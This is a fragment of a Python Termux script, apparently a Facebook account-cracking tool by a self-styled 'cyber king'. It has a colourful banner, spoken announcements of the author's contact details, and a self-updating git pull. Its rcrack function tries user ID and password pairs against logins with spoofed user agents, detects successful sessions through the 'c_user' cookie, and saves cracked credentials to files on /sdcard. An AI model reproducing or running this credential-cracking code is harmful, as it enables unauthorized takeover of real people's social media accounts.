...
print("\033[1;92m   [[[❤️]][[❤️]][[❤️]][[❤️]][[❤️]][[❤️]][[❤️]][[❤️]][[❤️]]] UPDATE CHECKING BOSS AKASH CYBER KING OF AKASH\033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH AKASH CYBER KING OFF AKASH "')
os.system("git pull")
...
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢K🌹⃝࿇  \033[38;5;46m║\033[38;5;46mAKASH CHOWDHURY   ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢A🌹⃝࿇  \033[38;5;46m║\033[38;5;46mAKASH CHOWDHURY   ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢S🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01778809977       ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢H🌹⃝࿇  \033[38;5;46m║\033[38;5;46mAKASH-123         ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢T🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01778809977       ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢O🌹⃝࿇  \033[38;5;46m║\033[38;5;46m01778809977       ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢O🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢L🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
os.system('espeak -a 300 "Akash Bd termux Hackr. com"')
os.system('espeak -a 300 "Facebook  Hackr vai"')
os.system('espeak -a 300 "whathapp 0 1 7 7 8 8 0 9 9 7 7 "')
os.system('espeak -a 300 "github AKASH-123 "')
os.system('espeak -a 300 "telegram 0 1 7 7 8 8 0 9 9 7 7 "')
os.system('espeak -a 300 "imo 0 1 7 7 8 8 0 9 9 7 7 "')
os.system('espeak -a 300 "from Bangladesh "')
os.system('espeak -a 300 "WELCOME Assalamu Alaikum I AKASHwill fast in the month of Ramadan inshallah"')
def linex():
	print('\033[1;94m✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺')
loop = 0
oks = []
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                import os
                open('/sdcard/MRX-AKASH-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[38;5;46m [AKASH-2F💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/\033[38;5;46MRX-AKASH.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['AKASHCYBER','AKASH-CYBER ','AKASHCRACK '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝AKASH𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38mAKASH🖤{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()